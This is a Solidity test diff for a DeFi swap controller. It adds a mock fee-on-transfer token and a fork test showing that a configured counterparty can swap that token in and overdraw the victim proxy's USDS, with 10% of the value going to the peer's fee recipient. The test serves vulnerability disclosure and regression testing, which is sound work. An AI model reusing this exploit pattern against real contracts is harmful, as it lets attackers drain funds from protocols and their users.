@@ -12,6 +12,49 @@ contract SwapAssetCallRelay {
     }
 }
 
+contract FeeRecipientToken {
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    address public immutable feeRecipient;
+    uint256 public constant FEE_BPS = 1_000;
+
+    constructor(address feeRecipient_) {
+        feeRecipient = feeRecipient_;
+    }
+
+    function decimals() external pure returns (uint8) { return 18; }
+
+    function mint(address to, uint256 amount) external {
+        balanceOf[to] += amount;
+    }
+
+    function approve(address spender, uint256 amount) external returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        return true;
+    }
+
+    function transfer(address to, uint256 amount) external returns (bool) {
+        _transfer(msg.sender, to, amount);
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
+        uint256 allowed = allowance[from][msg.sender];
+        require(allowed >= amount, "FeeRecipientToken/allowance");
+        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
+        _transfer(from, to, amount);
+        return true;
+    }
+
+    function _transfer(address from, address to, uint256 amount) internal {
+        uint256 fee = amount * FEE_BPS / 10_000;
+        balanceOf[from] -= amount;
+        balanceOf[to] += amount - fee;
+        balanceOf[feeRecipient] += fee;
+    }
+}
+
 contract SwapAssetCompleteAuthorizationFork is SwapAsset_TestBase {
     function test_unknownCounterpartyCannotCompleteSwapOrChangeProxyBalances() external {
         SwapAssetCallRelay relay = new SwapAssetCallRelay();
@@ -115,5 +158,54 @@ contract SwapAssetCompleteAuthorizationFork is SwapAsset_TestBase {
             )
         );
         assertEq(rateLimits.getRateLimitData(key).maxAmount, 0);
+    }
+
+    function test_configuredPeerCanExploitFeeOnTransferInputAndOverdrawLocalProxy() external {
+        FeeRecipientToken feeToken = new FeeRecipientToken(counterpartyAllocator);
+        uint256 amountOut = 100e18;
+
+        feeToken.mint(address(counterpartyProxy), amountOut);
+        deal(Ethereum.USDS, address(almProxy), amountOut);
+
+        bytes32 sourceInitiateKey = counterpartyController.swapAsset_getInitiateSwapRateLimitKey(
+            address(feeToken),
+            address(almProxy),
+            address(mainnetController),
+            Ethereum.USDS
+        );
+        bytes32 victimCompleteKey = mainnetController.swapAsset_getCompleteSwapRateLimitKey(
+            Ethereum.USDS,
+            address(counterpartyProxy),
+            address(feeToken)
+        );
+
+        vm.prank(counterpartyAdmin);
+        counterpartyRateLimits.setRateLimitData(sourceInitiateKey, amountOut, 0);
+        vm.prank(Ethereum.SPARK_PROXY);
+        rateLimits.setRateLimitData(victimCompleteKey, amountOut, 0);
+
+        uint256 victimUSDSBefore = IERC20Like(Ethereum.USDS).balanceOf(address(almProxy));
+        uint256 victimFeeTokenBefore = feeToken.balanceOf(address(almProxy));
+        uint256 attackerFeeBefore = feeToken.balanceOf(counterpartyAllocator);
+
+        vm.prank(counterpartyAllocator);
+        counterpartyController.swapAsset_initiateSwap(
+            address(mainnetController),
+            address(feeToken),
+            Ethereum.USDS,
+            amountOut
+        );
+
+        uint256 victimUSDSOut = victimUSDSBefore - IERC20Like(Ethereum.USDS).balanceOf(address(almProxy));
+        uint256 victimFeeIn = feeToken.balanceOf(address(almProxy)) - victimFeeTokenBefore;
+        uint256 feeCapturedByPeer = feeToken.balanceOf(counterpartyAllocator) - attackerFeeBefore;
+
+        assertEq(victimUSDSOut, amountOut);
+        assertEq(victimFeeIn, amountOut * 9_000 / 10_000);
+        assertEq(feeCapturedByPeer, amountOut / 10);
+
+        // At the facet's assumed 1:1 valuation, the victim paid 100 USDS for 90 tokens;
+        // the missing 10-token value was credited to the peer's fee recipient.
+        assertEq(victimUSDSOut - victimFeeIn, amountOut / 10);
     }
 }
